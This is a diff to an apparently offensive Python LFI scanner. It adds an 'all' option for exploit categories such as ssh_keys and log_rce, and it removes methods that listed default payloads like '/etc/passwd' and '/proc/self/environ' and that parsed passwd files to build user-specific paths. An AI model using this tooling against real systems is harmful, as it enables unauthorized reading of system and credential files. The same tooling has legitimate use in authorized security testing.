@@ -170,8 +170,10 @@ class LFIScanner:
             ]
         }
     }
-        self.payload_categories = self.categories 
+        if 'all' in self.selected_categories:
+            self.selected_categories = list(self.categories.keys())
 
+        self.payload_categories = self.categories 
 
 
     def _load_wordlist(self, wordlist_path):
@@ -199,36 +201,6 @@ class LFIScanner:
             print(f"[!] Wordlist error: {str(e)}")
             sys.exit(1)
             
-    def _generate_exploit_payloads(self):
-        """Generate FLAT list of payload strings"""
-        payloads = []
-        
-        # 1. Selected categories (strings)
-        for category in self.selected_categories:
-            if category in self.categories:
-                payloads.extend(self.categories[category]['payloads'])
-        
-        # 2. Custom payloads from wordlist (strings)
-        payloads.extend(self.exploit_files)
-        
-        # 3. Default system payloads (strings)
-        payloads.extend([
-            '/etc/passwd',
-            '/proc/self/environ',
-            'C:\\Windows\\win.ini'
-        ])
-        
-        # Validate all payloads are strings
-        valid_payloads = []
-        for p in payloads:
-            if isinstance(p, str):
-                valid_payloads.append(p)
-            else:
-                print(f"[!] Invalid payload type: {type(p)} - {p}")
-        
-        # Deduplicate
-        seen = set()
-        return [p for p in valid_payloads if not (p in seen or seen.add(p))]
             
     def _add_entry(self, entry):
         """Universal deduplication with proper phase handling"""
@@ -867,31 +839,8 @@ class LFIScanner:
         elif any(p in content for p in ['[boot loader]', '[extensions]']):
             return 'windows'
         return 'unknown'
-
-    def _get_baseline(self, url):
-        """Baseline response analysis
-        - Captures normal response characteristics
-        - Future use for anomaly detection
-        - Currently not fully implemented"""
-        try:
-            response = self.session.get(url, timeout=10)
-            return {
-                'status': response.status_code,
-                'length': len(response.text),
-                'content_type': response.headers.get('content-type', '')
-            }
-        except Exception as e:
-            print(f"[-] Baseline error: {str(e)}")
-            return None
         
-    def _process_exploitation_results(self, result):
-        """Handle /etc/passwd parsing and user-specific files"""
-        if result['target_file'] == '/etc/passwd' and result['status'] == 200:
-            users = self._extract_users_from_passwd(result['content'])
-            self._generate_user_files(users)
-
-        self.exploitation_results.append(result)
-
+ 
     def _extract_users_from_passwd(self, passwd_content):
         """Extract users with valid home directories and shells"""
 
@@ -940,17 +889,6 @@ class LFIScanner:
                     self.exploit_files.append(encoded_path)
                     print(f"[*] Generated user path: {encoded_path}")
 
-    def generate_poc_report(results):
-        """Generate minimal proof-of-concept report"""
-        poc_data = [entry for entry in results if entry.get('phase') == 'detection']
-        with open('poc_report.json', 'w') as f:
-            json.dump(poc_data, f, indent=2)
-
-    def generate_full_report(results):
-        """Generate comprehensive exploitation report"""
-        with open('full_report.json', 'w') as f:
-            json.dump(results, f, indent=2)
-        
     def reset_scanner(self):
         """Reset scanner state between URL scans"""
         self.visited_urls = set()
@@ -981,6 +919,7 @@ def main():
 
     parser.add_argument("--exploit", nargs="*",
                         choices=[
+                        "all",
                         "linux_system", "linux_users", "log_rce",
                         "web_servers", "cron_jobs", "database",
                         "ftp_configs", "ssh_keys", "boot_files",
